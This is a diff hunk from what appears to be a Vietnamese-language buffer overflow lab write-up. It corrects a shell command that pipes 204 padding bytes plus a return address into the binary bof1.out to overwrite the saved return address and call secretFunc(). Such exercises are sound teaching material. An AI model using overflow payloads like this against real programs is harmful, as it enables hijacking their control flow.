@@ -34,7 +34,7 @@ Xem qua code ta có thể thấy lỗ hỏng nó đến từ hàm get(array) c�
   tự ngẫu nhiên và truyền thêm 4 bytes địa chỉ hàm secretFunc() nữa để đè lên return addr là ta có thể gọi hàm này
 * Bước 4: Thực hiền truyền input
   ```
-  echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out)") | ./bof1.out
+  echo $(python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
   ```
   Kết quả:
   ![image](https://github.com/user-attachments/assets/eea0cbe7-a3a0-48b8-b9bc-8d79118d33b2)
